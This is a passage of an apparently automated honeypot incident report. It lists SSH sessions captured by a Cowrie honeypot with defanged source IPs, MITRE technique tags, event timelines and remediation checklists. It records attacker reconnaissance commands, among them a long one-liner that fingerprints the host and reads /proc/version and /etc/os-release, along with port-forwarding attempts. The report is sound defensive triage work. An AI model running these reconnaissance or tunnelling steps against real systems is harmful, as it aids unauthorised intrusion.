- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0171503d601d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:59 |
| **Last Seen** | 2026-07-19 04:59 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:59:04` | `cowrie.session.connect` |
| `2026-07-19 04:59:08` | `cowrie.client.version` |
| `2026-07-19 04:59:08` | `cowrie.client.kex` |
| `2026-07-19 04:59:17` | `cowrie.login.success` |
| `2026-07-19 04:59:29` | `cowrie.session.params` |
| `2026-07-19 04:59:29` | `cowrie.command.input` |
| `2026-07-19 04:59:32` | `cowrie.log.closed` |
| `2026-07-19 04:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17b16ba47ba0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:59 |
| **Last Seen** | 2026-07-19 04:59 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:59:15` | `cowrie.session.connect` |
| `2026-07-19 04:59:19` | `cowrie.client.version` |
| `2026-07-19 04:59:19` | `cowrie.client.kex` |
| `2026-07-19 04:59:32` | `cowrie.login.success` |
| `2026-07-19 04:59:42` | `cowrie.session.params` |
| `2026-07-19 04:59:42` | `cowrie.command.input` |
| `2026-07-19 04:59:47` | `cowrie.log.closed` |
| `2026-07-19 04:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad2fdf295567

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:59 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:59:32` | `cowrie.session.connect` |
| `2026-07-19 04:59:37` | `cowrie.client.version` |
| `2026-07-19 04:59:37` | `cowrie.client.kex` |
| `2026-07-19 05:00:03` | `cowrie.login.success` |
| `2026-07-19 05:00:14` | `cowrie.session.params` |
| `2026-07-19 05:00:14` | `cowrie.command.input` |
| `2026-07-19 05:00:20` | `cowrie.log.closed` |
| `2026-07-19 05:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8f23819d83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:59 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:59:46` | `cowrie.session.connect` |
| `2026-07-19 04:59:51` | `cowrie.client.version` |
| `2026-07-19 04:59:51` | `cowrie.client.kex` |
| `2026-07-19 05:00:07` | `cowrie.login.success` |
| `2026-07-19 05:00:19` | `cowrie.session.params` |
| `2026-07-19 05:00:19` | `cowrie.command.input` |
| `2026-07-19 05:00:23` | `cowrie.log.closed` |
| `2026-07-19 05:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87eb2e30ed51

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 04:59 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:59:56` | `cowrie.session.connect` |
| `2026-07-19 04:59:57` | `cowrie.client.version` |
| `2026-07-19 04:59:57` | `cowrie.client.kex` |
| `2026-07-19 04:59:58` | `cowrie.login.success` |
| `2026-07-19 04:59:59` | `cowrie.session.params` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.success` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 04:59:59` | `cowrie.command.input` |
| `2026-07-19 05:00:00` | `cowrie.log.closed` |
| `2026-07-19 05:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a35c02f9914

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:00 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:00:01` | `cowrie.session.connect` |
| `2026-07-19 05:00:06` | `cowrie.client.version` |
| `2026-07-19 05:00:06` | `cowrie.client.kex` |
| `2026-07-19 05:00:26` | `cowrie.login.success` |
| `2026-07-19 05:00:38` | `cowrie.session.params` |
| `2026-07-19 05:00:38` | `cowrie.command.input` |
| `2026-07-19 05:00:42` | `cowrie.log.closed` |
| `2026-07-19 05:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3efc3580069a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:00 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:00:21` | `cowrie.session.connect` |
| `2026-07-19 05:00:25` | `cowrie.client.version` |
| `2026-07-19 05:00:25` | `cowrie.client.kex` |
| `2026-07-19 05:00:44` | `cowrie.login.success` |
| `2026-07-19 05:00:53` | `cowrie.session.params` |
| `2026-07-19 05:00:53` | `cowrie.command.input` |
| `2026-07-19 05:00:56` | `cowrie.log.closed` |
| `2026-07-19 05:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7bbd057e6fc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:00 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:00:33` | `cowrie.session.connect` |
| `2026-07-19 05:00:39` | `cowrie.client.version` |
| `2026-07-19 05:00:39` | `cowrie.client.kex` |
| `2026-07-19 05:00:49` | `cowrie.login.success` |
| `2026-07-19 05:00:55` | `cowrie.session.params` |
| `2026-07-19 05:00:55` | `cowrie.command.input` |
| `2026-07-19 05:00:59` | `cowrie.log.closed` |
| `2026-07-19 05:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e3f5739cf7e

| Field | Detail |
|---|---|
| **Source IP** | `179.184.218[.]49` |
| **First Seen** | 2026-07-19 05:00 |
| **Last Seen** | 2026-07-19 05:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:00:43` | `cowrie.session.connect` |
| `2026-07-19 05:00:44` | `cowrie.client.version` |
| `2026-07-19 05:00:44` | `cowrie.client.kex` |
| `2026-07-19 05:00:46` | `cowrie.login.success` |
| `2026-07-19 05:00:46` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.218[.]49` to AbuseIPDB if not already reported
- [ ] Block `179.184.218[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8e8ce3259e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:00 |
| **Last Seen** | 2026-07-19 05:01 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:00:53` | `cowrie.session.connect` |
| `2026-07-19 05:00:56` | `cowrie.client.version` |
| `2026-07-19 05:00:56` | `cowrie.client.kex` |
| `2026-07-19 05:01:05` | `cowrie.login.success` |
| `2026-07-19 05:01:10` | `cowrie.session.params` |
| `2026-07-19 05:01:10` | `cowrie.command.input` |
| `2026-07-19 05:01:14` | `cowrie.log.closed` |
| `2026-07-19 05:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34f90c7a4b9

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-07-19 05:00 |
| **Last Seen** | 2026-07-19 05:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:00:53` | `cowrie.session.connect` |
| `2026-07-19 05:00:55` | `cowrie.client.version` |
| `2026-07-19 05:00:55` | `cowrie.client.kex` |
| `2026-07-19 05:01:05` | `cowrie.login.success` |
| `2026-07-19 05:01:07` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb2b3e85252

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:01 |
| **Last Seen** | 2026-07-19 05:01 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:01:09` | `cowrie.session.connect` |
| `2026-07-19 05:01:12` | `cowrie.client.version` |
| `2026-07-19 05:01:12` | `cowrie.client.kex` |
| `2026-07-19 05:01:30` | `cowrie.login.success` |
| `2026-07-19 05:01:39` | `cowrie.session.params` |
| `2026-07-19 05:01:39` | `cowrie.command.input` |
| `2026-07-19 05:01:45` | `cowrie.log.closed` |
| `2026-07-19 05:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0821f071f7ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:01 |
| **Last Seen** | 2026-07-19 05:02 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:01:24` | `cowrie.session.connect` |
| `2026-07-19 05:01:28` | `cowrie.client.version` |
| `2026-07-19 05:01:28` | `cowrie.client.kex` |
| `2026-07-19 05:01:52` | `cowrie.login.success` |
| `2026-07-19 05:02:04` | `cowrie.session.params` |
| `2026-07-19 05:02:04` | `cowrie.command.input` |
| `2026-07-19 05:02:08` | `cowrie.log.closed` |
| `2026-07-19 05:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d501a037024

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 05:01 |
| **Last Seen** | 2026-07-19 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:01:28` | `cowrie.session.connect` |
| `2026-07-19 05:01:28` | `cowrie.client.version` |
| `2026-07-19 05:01:28` | `cowrie.client.kex` |
| `2026-07-19 05:01:28` | `cowrie.login.success` |
| `2026-07-19 05:01:29` | `cowrie.session.params` |
| `2026-07-19 05:01:29` | `cowrie.command.input` |
| `2026-07-19 05:01:29` | `cowrie.log.closed` |
| `2026-07-19 05:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2bf92f99494

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:01 |
| **Last Seen** | 2026-07-19 05:02 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:01:37` | `cowrie.session.connect` |
| `2026-07-19 05:01:44` | `cowrie.client.version` |
| `2026-07-19 05:01:44` | `cowrie.client.kex` |
| `2026-07-19 05:02:04` | `cowrie.login.success` |
| `2026-07-19 05:02:11` | `cowrie.session.params` |
| `2026-07-19 05:02:11` | `cowrie.command.input` |
| `2026-07-19 05:02:16` | `cowrie.log.closed` |
| `2026-07-19 05:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272bc15acbaa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:01 |
| **Last Seen** | 2026-07-19 05:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:01:48` | `cowrie.session.connect` |
| `2026-07-19 05:01:48` | `cowrie.client.version` |
| `2026-07-19 05:01:48` | `cowrie.client.kex` |
| `2026-07-19 05:01:50` | `cowrie.login.success` |
| `2026-07-19 05:01:51` | `cowrie.session.params` |
| `2026-07-19 05:01:51` | `cowrie.command.input` |
| `2026-07-19 05:01:51` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.success` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.command.input` |
| `2026-07-19 05:01:52` | `cowrie.log.closed` |
| `2026-07-19 05:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3dedb6159d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:01 |
| **Last Seen** | 2026-07-19 05:02 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:01:52` | `cowrie.session.connect` |
| `2026-07-19 05:01:56` | `cowrie.client.version` |
| `2026-07-19 05:01:56` | `cowrie.client.kex` |
| `2026-07-19 05:02:14` | `cowrie.login.success` |
| `2026-07-19 05:02:27` | `cowrie.session.params` |
| `2026-07-19 05:02:27` | `cowrie.command.input` |
| `2026-07-19 05:02:29` | `cowrie.log.closed` |
| `2026-07-19 05:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465ff7f5015f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:02 |
| **Last Seen** | 2026-07-19 05:02 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:02:10` | `cowrie.session.connect` |
| `2026-07-19 05:02:14` | `cowrie.client.version` |
| `2026-07-19 05:02:14` | `cowrie.client.kex` |
| `2026-07-19 05:02:29` | `cowrie.login.success` |
| `2026-07-19 05:02:31` | `cowrie.session.params` |
| `2026-07-19 05:02:31` | `cowrie.command.input` |
| `2026-07-19 05:02:32` | `cowrie.log.closed` |
| `2026-07-19 05:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f266b6b2e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:02 |
| **Last Seen** | 2026-07-19 05:02 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:02:16` | `cowrie.session.connect` |
| `2026-07-19 05:02:29` | `cowrie.client.version` |
| `2026-07-19 05:02:29` | `cowrie.client.kex` |
| `2026-07-19 05:02:33` | `cowrie.login.success` |
| `2026-07-19 05:02:34` | `cowrie.session.params` |
| `2026-07-19 05:02:34` | `cowrie.command.input` |
| `2026-07-19 05:02:35` | `cowrie.log.closed` |
| `2026-07-19 05:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47df1d745839

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:02 |
| **Last Seen** | 2026-07-19 05:03 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:02:38` | `cowrie.session.connect` |
| `2026-07-19 05:02:44` | `cowrie.client.version` |
| `2026-07-19 05:02:44` | `cowrie.client.kex` |
| `2026-07-19 05:03:13` | `cowrie.login.success` |
| `2026-07-19 05:03:23` | `cowrie.session.params` |
| `2026-07-19 05:03:23` | `cowrie.command.input` |
| `2026-07-19 05:03:28` | `cowrie.log.closed` |
| `2026-07-19 05:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eae4c6db0185

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:02 |
| **Last Seen** | 2026-07-19 05:03 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:02:54` | `cowrie.session.connect` |
| `2026-07-19 05:03:01` | `cowrie.client.version` |
| `2026-07-19 05:03:01` | `cowrie.client.kex` |
| `2026-07-19 05:03:23` | `cowrie.login.success` |
| `2026-07-19 05:03:35` | `cowrie.session.params` |
| `2026-07-19 05:03:35` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.log.closed` |
| `2026-07-19 05:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879fb71c0f83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:03 |
| **Last Seen** | 2026-07-19 05:03 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:03:17` | `cowrie.session.connect` |
| `2026-07-19 05:03:20` | `cowrie.client.version` |
| `2026-07-19 05:03:20` | `cowrie.client.kex` |
| `2026-07-19 05:03:43` | `cowrie.login.success` |
| `2026-07-19 05:03:52` | `cowrie.session.params` |
| `2026-07-19 05:03:52` | `cowrie.command.input` |
| `2026-07-19 05:03:56` | `cowrie.log.closed` |
| `2026-07-19 05:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063d8e2c0186

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:03 |
| **Last Seen** | 2026-07-19 05:04 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:03:29` | `cowrie.session.connect` |
| `2026-07-19 05:03:35` | `cowrie.client.version` |
| `2026-07-19 05:03:35` | `cowrie.client.kex` |
| `2026-07-19 05:03:54` | `cowrie.login.success` |
| `2026-07-19 05:04:03` | `cowrie.session.params` |
| `2026-07-19 05:04:03` | `cowrie.command.input` |
| `2026-07-19 05:04:06` | `cowrie.log.closed` |
| `2026-07-19 05:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ca854db9a0

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-19 05:03 |
| **Last Seen** | 2026-07-19 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
